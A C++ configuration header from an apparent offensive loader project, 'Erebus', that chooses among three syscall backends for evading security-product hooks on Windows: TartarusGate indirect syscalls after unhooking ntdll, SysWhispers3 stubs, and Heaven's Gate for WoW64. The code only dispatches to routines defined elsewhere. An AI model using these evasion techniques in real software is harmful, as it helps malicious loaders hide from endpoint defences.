#ifndef EREBUS_SYSCALL_BACKEND_HPP
#define EREBUS_SYSCALL_BACKEND_HPP
#pragma once

// CONFIG_SYSCALL_BACKEND - selects the syscall dispatch layer.
//
//   0  TartarusGate  (default, x64 only)
//        Built-in. After UnhookNtdll() restores clean stubs, extracts SSNs
//        from the `mov eax, imm32` prologues and plants 21-byte shims in an
//        RX page. Each shim does `mov r10,rcx; mov eax,ssn; jmp gadget` where
//        gadget is a `syscall; ret` sequence inside ntdll .text, so the kernel
//        sees a legitimate ntdll-originated syscall. No external files needed.
//
//   1  SysWhispers3  (x64 only)
//        External. Uses Sw3Nt* stubs from include/evasion/sw3/Syscalls.h and
//        the accompanying src/evasion/Syscalls.c + Syscalls-asm.x64.asm.
//        Stubs are self-initialising (SSN resolved at first call via jumper).
//        Syscalls.h must be included BEFORE loader.hpp to avoid type conflicts
//        (done in sw3_backend.cpp; do not include Syscalls.h elsewhere directly).
//
//   2  Heaven's Gate  (x86 / WoW64 only)
//        32-bit loader on 64-bit Windows. Switches to CS:0x33 (64-bit long
//        mode) via a far ret, issues the native 64-bit syscall, then returns
//        to CS:0x23 (32-bit compat). Resolves SSNs from the 64-bit ntdll
//        mapped by WoW64. No byte patches to any DLL; stubs live in a private
//        RX page. Requires ARCH=x86 and a WoW64 process.
//        Source: src/evasion/heavens_gate.S + heavens_gate.cpp.
//
#ifndef CONFIG_SYSCALL_BACKEND
#define CONFIG_SYSCALL_BACKEND 0
#endif

#if CONFIG_SYSCALL_BACKEND == 0

    #include "syscalls.hpp"

    namespace erebus { namespace evasion {
        inline BOOL  InitSyscallBackend()    { return InitIndirectSyscalls(); }
        inline PVOID GetSyscallStub(ULONG h) { return GetIndirectSyscall(h); }
    }}

#elif CONFIG_SYSCALL_BACKEND == 1

    // Do NOT include Syscalls.h here - it redefines types already in loader.hpp.
    // The Syscalls.h include lives in sw3_backend.cpp, before loader.hpp.
    namespace erebus { namespace evasion {
        BOOL  InitSyscallBackend();
        PVOID GetSyscallStub(ULONG funcHash);
    }}

#elif CONFIG_SYSCALL_BACKEND == 2

    #include "heavens_gate.hpp"

    namespace erebus { namespace evasion {
        inline BOOL  InitSyscallBackend()    { return InitHeavensGate(); }
        inline PVOID GetSyscallStub(ULONG h) { return GetHeavensGateStub(h); }
    }}

#else
    #error "CONFIG_SYSCALL_BACKEND must be 0 (TartarusGate), 1 (SysWhispers3), or 2 (Heaven's Gate)"
#endif

#endif
